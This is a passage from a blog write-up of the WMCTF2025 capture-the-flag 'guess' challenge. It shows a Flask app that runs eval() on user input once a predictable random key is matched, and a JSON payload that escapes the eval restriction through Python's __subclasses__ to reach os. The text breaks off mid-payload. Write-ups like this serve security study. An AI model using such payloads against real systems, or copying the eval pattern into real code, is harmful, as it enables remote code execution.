<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1317&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="还是被N1打成筛子了">
<title>WMCTF2025</title>

<link rel='canonical' href='http://localhost:1317/p/wmctf-2025/'>

<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="WMCTF2025">
<meta property='og:description' content="还是被N1打成筛子了">
<meta property='og:url' content='http://localhost:1317/p/wmctf-2025/'>
<meta property='og:site_name' content='baozongwi&#39;s blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ssti' /><meta property='article:tag' content='go' /><meta property='article:published_time' content='2025-09-21T10:44:45&#43;08:00'/><meta property='article:modified_time' content='2025-09-21T10:44:45&#43;08:00'/>
<meta name="twitter:title" content="WMCTF2025">
<meta name="twitter:description" content="还是被N1打成筛子了">
    <link rel="shortcut icon" href="/logo.png" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/acvtar_hu_773da4d2b586f7f.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">baozongwi&#39;s blog</a></h1>
            <h2 class="site-description">H@cking Th3 Fu1ure</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='mailto:baozongwi@qq.com'
                        target="_blank"
                        title="Email"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <rect x="3" y="5" width="18" height="14" rx="2"/>
  <path d="M3 7l9 6l9 -6"/>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='/index.xml'
                        target="_blank"
                        title="RSS"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="5" cy="19" r="1" />
  <path d="M4 4a16 16 0 0 1 16 16" />
  <path d="M4 11a9 9 0 0 1 9 9" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/baozongwi'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#guess">guess</a></li>
    <li><a href="#pdf2text">pdf2text</a></li>
    <li><a href="#shopping-company1">Shopping company1</a></li>
    <li><a href="#shopping-company3">Shopping company3</a></li>
    <li><a href="#shopping-company2">Shopping company2</a></li>
    <li><a href="#小结">小结</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    
        <article class="main-article">
            <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E8%B5%9B%E9%A2%98/" >
                赛题
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/wmctf-2025/">WMCTF2025</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            还是被N1打成筛子了
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Sep 21, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    21 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

            <section class="article-content">
                
                
                <h2 id="guess">guess
</h2><p>by baozongwi</p>
<p>应用代码如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">redirect</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rd</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">Random</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_random_string</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">rd</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;register.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">password</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Username and password are required&#39;</span><span class="p">}),</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="n">username</span> <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Username already exists&#39;</span><span class="p">}),</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">users</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;User registered successfully&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user_id</span>
</span></span><span class="line"><span class="cl">    <span class="p">}),</span> <span class="mi">201</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">password</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Username and password are required&#39;</span><span class="p">}),</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="nb">next</span><span class="p">((</span><span class="n">user</span> <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span> <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="n">password</span><span class="p">),</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">user</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Invalid credentials&#39;</span><span class="p">}),</span> <span class="mi">401</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;Login successful&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">}),</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.post</span><span class="p">(</span><span class="s1">&#39;/api&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">protected_api</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key1</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;key&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">key1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;key are required&#39;</span><span class="p">}),</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">key2</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="nb">str</span><span class="p">(</span><span class="n">key1</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span><span class="p">(</span><span class="n">key2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;Not Allowed:&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">key2</span><span class="p">)</span> <span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">}),</span> <span class="mi">403</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;payload&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">eval</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;__builtin__&#39;</span><span class="p">:{}})</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;Access granted&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5001</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>过了key2就可以直接RCE了，不出网，先创建静态文件夹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;key&#34;</span><span class="p">:</span> <span class="s2">&#34;3345821131&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;payload&#34;</span><span class="p">:</span> <span class="s2">&#34;(lambda o: o.mkdir(&#39;static&#39;))(next(c.__init__.__globals__[&#39;os&#39;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#39;__globals__&#39;) and &#39;os&#39; in c.__init__.__globals__))&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>再写入文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;key&#34;</span><span class="p">:</span> <span class="s2">&#34;3345821131&#34;</span><span class="p">,</span>
